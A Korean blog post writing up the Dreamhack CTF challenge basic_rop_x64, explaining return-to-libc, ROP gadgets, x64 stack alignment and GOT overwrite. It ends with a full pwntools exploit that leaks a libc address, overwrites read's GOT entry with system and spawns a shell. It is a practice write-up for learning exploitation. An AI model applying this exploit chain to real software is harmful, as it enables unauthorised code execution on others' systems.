---
layout: post
title: <System Hacking> 13. RTL, ROP, GOT overwrite, Stack Alignment (2026.04.30 수정)
date: 2022-09-21 19:30:23 +0900
category: System_Hacking
comments: true
---

## 실습문제

이번 포스팅은 Dreamhack의 basic_rop_x64문제를 직접 복습하면서 설명하도록 하겠다.

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main(int argc, char *argv[]) {
    char buf[0x40] = {};

    initialize();

    read(0, buf, 0x400);
    write(1, buf, sizeof(buf));

    return 0;
}

```

이것이 해당 실습문제이다. 일단 취약점을 분석해보면, 

1. read()함수에서 buf 이상의 값을 받아들이려고 하고 있으므로, 이 곳에서 BOF 취약점이 발생함을 알수있다.
2. checksec 명령어로 주어진 바이너리 파일 (basic_rop_x64)을 분석해보면, NX enabled가 되어있는 대신에, 특이하게도 Stack canary가 Disabled 되어있다. 사실, 카나리 우회는 하도 많이 해서, 크게 어렵지는 않은 부분이라 있어도 없어도 그만이다.
3. write()함수에서 BOF 관련 취약점을 발견할 수 없기 때문에, 이 함수를 이용하기는 어려워보인다.

### Return To Library

일단 NX가 적용된 문제이기 때문에, buf에 shellcode를 주입하는 등의 기존의 공격방법은 통하지 않는다. **NX가 적용된 경우, 실행 권한이 있는 메모리 영역은 코드 영역 부분**이다. 특히, 라이브러리 관련 코드 영역을 적극적으로 이용하여 NX를 우회하여 해킹을 하는 방법을 자주 사용하게 된다. 이를 **Return to Library** 기법이라고 한다. 특히, **리눅스에서 C언어로 작성된 프로그램이 참조하는 libc**에는 다양한 함수들이 기본적으로 구현되어있는데, 이 곳을 적극적으로 공략할 것이다.

<br/>

하지만, 문제의 코드에서 알 수 있듯이, 당장 libc로 접근하는 방법은 가시적으로 보이지 않는다. 그래서, **Gadget**이란 코드 조각을 이용하게 된다. 

### Gadget

**Gadget**은 바이너리 내 코드 영역 어딘가에 위치하는, 컴파일 시에 결정되는 고정적인 어셈블리 코드조각을 이야기한다. 주로 다음과 같은 위치에 존재하게 된다. 

1. 실행 파일의 .text 영역
2. libc
3. 기타 공유 라이브러리

즉, **컴파일된 바이너리 내에는 수천 개의 "우연한 가젯"이 존재**한다. 그 중에서, ret 어셈블리 명령어로 끝나는 가젯들을 특별히 **return gadget**이라 부른다. (일부 정보에서는 ret 단일 조각을 return gadget이라고 부르기도 한다. 엄청 중요한 건 아니니 용어는 return gadget으로 통일하겠다.)

```
pop rdi; ret
```

위의 일련의 어셈블리 명령어가 return gadget의 예이다. BOF를 발생시켜서 SFP 다음에 위치하는 return address에 스택 내의 악의적인 실행 코드를 대입해도, **NX로 인해 스택 내 코드는 실행 권한이 없기 때문에**, 이 방법을 대신하여 **return address에 return gadget이 존재하는 주소(주의: return gadget 자체를 넣는 것이 아니다. 헷갈리니 주의하자.)를 대입**시킨다. **그 후, 적절한 코드 영역의 함수 주소를 return gadget의 ret 부분에서 호출**하는 우회 방식을 사용하게 된다. 간단한 예시를 살펴보자.

```
[padding]
[pop rdi; ret의 주소]   ← gadget 1
["/bin/sh"]      ← pop돼서 rdi에 들어감
[system]         ← ret에 의해 여기로 점프
```

이 경우, 실행 흐름은 다음과 같다.

1. RIP → pop rdi
2. rdi = "/bin/sh"
3. ret
4. RIP → system
5. system("/bin/sh") 실행

<br/>

참고로, 아래처럼 ret 하나짜리 return gadget도 중요하다. 이건 주로 **x64에서 스택 정렬**시에 사용되는데, libc 함수를 호출하기 전에 ret 하나를 끼워넣어서 스택을 정렬해야 정상적으로 프로그램이 동작할 때가 종종 있다. 자세한 내용은 아래에서 다시 다루겠다.

```
payload:
[padding]
[ret]          ← return gadget
[pop rdi; ret의 주소] ← gadget
["/bin/sh"]
[system]
```

그렇다면 이런 가젯들은 직접 찾아야할까? 아니다. 기존에 뛰어난 선배 개발자 및 해커분들이 개발해놓은 좋은 도구들을 잘 활용하면 된다. 대표적으로는 **ROPgadget, pwntools** 등의 도구들에서 잘 구현되어있다.

```
pip install ROPgadget
ROPgadget --binary ./vuln | grep "pop rdi"
```

이를 pwntools에서 같이 사용하는 방법은 다음과 같다.

```python
from pwn import *

elf = ELF("./vuln")
rop = ROP(elf)

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
```

### Stack Alignment 심화

ROP / RTL은 call이 아니라 ret으로 호출되는데, 이 과정에서 x64 리눅스의 경우 Stack Alignment 문제가 발생한다. 아래와 같이 control instruction에서 차이가 발생하는 것이다.

- jmp: 스택 변화 없음
- call: return address push → RSP -= 8
- ret: pop rip → RSP += 8

함수는 call로 불릴 것을 전제로 ABI가 설계되었으나, ROP에서는 ret으로 함수에 진입하게 된다. 그 결과,

- 함수 entry 시점의 stack alignment가 깨지고
- 이후 system() → do_system()에서 movaps가 실행되면
- SIGSEGV가 발생한다 (Ubuntu 18.04부터 do_system()에 이 코드가 추가됨.)

따라서, 위에서 언급했던 것 처럼 RET sled 방식을 통해 Stack을 다시 Alignment해야된다.

- ret 하나 = RSP += 8
- ret을 하나 더 넣으면 stack alignment 토글

정리해보면 Stack Alignment를 지키면서 함수를 호출하는 흐름은 다음과 같다.

- call 실행 직전 RSP는 16의 배수 ( stack align O )
- 함수의 entry point에선 RSP+8이 16의 배수 ( stack align X )
- 함수의 프롤로그 실행 후 RSP는 16의 배수 ( stack align O )
- RBP는 항상 16의 배수 ( stack align O )

함수를 호출할 때 2번 과정에서 잠시 stack align이 깨지고 3번에서 다시 stack align이 맞춰진다. 참고로, 4번만 신경 써줘도 공격 코드를 짜는데 지장이 없다.

### RTL과 ROP

**Return To Library (ret2libc)**는 libc 함수 하나를 호출하여 NX를 우회하는 가장 기본적인 기법이라면, **Return Oriented Programming (ROP)**는 이를 확장하여, 여러 가젯 체인을 구성하는 방법이다. 즉, RTL을 일반화한 형태가 바로 ROP라고 보아도 무방하다.

### 익스플로잇 플랜

현재 분석하고 있는 바이너리에서는 read, write 함수가 사용되었기 때문에, 이 바이너리의 got table에는 두 함수가 등록되어있을 것이다. 이 **got table에 적힌 실제 함수의 주소는 곧 libc의 주소와 밀접하게 배치되어있다**는 특징을 이용하여, libc의 주소에 접근할 것이다. 그리고, 곧 **libc 내에 있는 쉘 획득 함수인 system 함수의 주소를 알아낼 수 있는데, 같은 libc 안에서 두 데이터 사이의 offset은 항상 같기 때문이다.** 즉, libc 내에서 system 함수와 read 함수 사이의 offset은 항상 동일하고, system 함수와 libc base 주소 사이의 offset도 항상 동일하다.

<br/>

이를 이용하여, return gadget을 chain처럼 연결하여, libc의 주소를 통해 system 함수를 연이어 호출하고, 이를 통해 쉘을 획득하는 과정을 거칠 것이다. 이 과정에서 system 함수의 주소를 구한 뒤에, 이 주소를 got table의 임의의 함수 주소에 overwrite하는 방법을 사용할 것인데, 이를 **GOT overwrite** 라고 한다. 이것이 가능한 이유는, Lazy binding의 특징을 보면 알 수 있는데,

1.호출할 라이브러리 함수의 주소를 프로세스에 매핑된 라이브러리에서 찾는다.
2.찾은 주소를 GOT에 적고, 이를 호출한다.
3.해당 함수를 다시 호출할 경우, GOT에 적힌 주소를 그대로 참조한다.

위 과정에서 GOT Overwrite에 이용되는 부분인 3번을 보면, GOT에 적힌 주소를 검증하지 않고 참조하므로 GOT에 적힌 주소를 변조할 수 있다면, 해당 함수가 재호출될 때 공격자가 원하는 코드가 실행되게 할 수 있기 때문이다.

### 익스플로잇 구현

내가 구현한 파이썬 익스플로잇 코드이다.

```py
from pwn import *

#p = process('./basic_rop_x64')
p = remote('host3.dreamhack.games',24572)
e = ELF('./basic_rop_x64')
libc = ELF('./libc.so.6')

payload = b'A'*0x40 + b'B'*0x8

read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
write_got = e.got['write']

pop_rdi_gadget = 0x0000000000400883
pop_rsi_r15_gadget = 0x0000000000400881

# write(1, read_got)
payload += p64(pop_rdi_gadget) + p64(1)
payload += p64(pop_rsi_r15_gadget) + p64(read_got) + p64(0)
payload += p64(write_plt)

# read(0, read_got)
payload += p64(pop_rdi_gadget) + p64(0)
payload += p64(pop_rsi_r15_gadget) + p64(read_got) + p64(0)
payload += p64(read_plt)

# system('/bin/sh')
payload += p64(pop_rdi_gadget) + p64(read_got+0x8)
payload += p64(read_plt)

p.send(payload)
p.recvuntil(b'A'*0x40)
result = u64(p.recvn(6)+b'\x00'*2)
lb = result - libc.symbols['read']
system_addr = lb + libc.symbols['system']

print(hex(result))
print(hex(lb))
print(hex(system_addr))

p.send(p64(system_addr) + b'/bin/sh\x00')
p.interactive()
```

1. 카나리 우회가 필요없기 때문에, 카나리 관련 코드는 없다.
2. return address 부분에 pop rdi; pop rsi; pop r15; ret 가젯을 삽입하여, write 함수가 실행되도록 하였다. write 함수의 인자를 rdi, rsi 레지스터로 받기 때문이다. 참고로, write, read 함수의 인자는 3개가 필요하기 때문에 이를 조심하자. 아무튼, write 함수를 통해 read 함수의 got 주소를 leak 하게끔 하였다.
3. 구한 read_got 주소를 이용해서 pwntools의 symbols함수를 이용하여 offset을 빼주어서 libc의 주소를 알아낼 수 있고, 다시 libc의 기본 주소에 system 함수의 offset을 더해서 system 함수의 주소를 알아낼 수 있다. 
4. write 함수의 호출이 끝날때쯤, 함수의 에필로그에서 leave, ret 명령어가 존재하기 때문에, 연이어서 다음 가젯이 실행될 수 있다.
5. 연이어서 2번과 유사하게 이번에는 read (0, read_got, rdx사이즈) 를 실행시키는 가젯을 삽입했다. 이를 통해서, 표준 입력인 fd = 0 을 통해 입력받은 값을 read_got 주소에 overwrite하게 된다. 이 과정이 **GOT overwrite 기법** 이다. 여기서 입력은, 마지막 줄에서 보이는 send를 통해 system의 주소값으로 이루어진다.
6. system 함수의 주소로 read 함수의 got 테이블 주소가 바뀌었다. 이제 **다시 read함수를 재호출**하면, read함수의 got table을 시스템이 참조하게 되는데, 이미 system 함수의 주소로 변조되어있기 때문에, system('/bin/sh')가 실행되면서 쉘을 획득한다.

## 마치며

여기서 내가 어이없이 헤메었던 부분이 있는데, 다음과 같다.

1. write함수가 0x40만큼 딱 읽는걸 놓쳐서 고생했다. 코드를 잘 읽자.
2. 애초에 write 함수 0x40 만큼 출력한 후에, 내가 보낸 payload로 인해 leak된 값이 출력된다. 즉, p.send(payload)를 하면, 돌아오는 데이터는 A*0x40 + leak 주소. 내가 recvn으로 받으니까 AAAAAA값이 받아지는거였다.. 그리고, recv(1024)로 받아도, 첫 write 함수가 보낸 값만 받아진다. 따라서, recvuntil()로 먼저 A값을 다 받고, 그 뒤의 주소를 받아야한다. 나는 당연히 write보다 먼저 leak 작업을 했으니, leak주소가 먼저 나올줄알았다..

결론 : **recv 되는 출력값을 먼저 확인하는 습관을 가지자..**
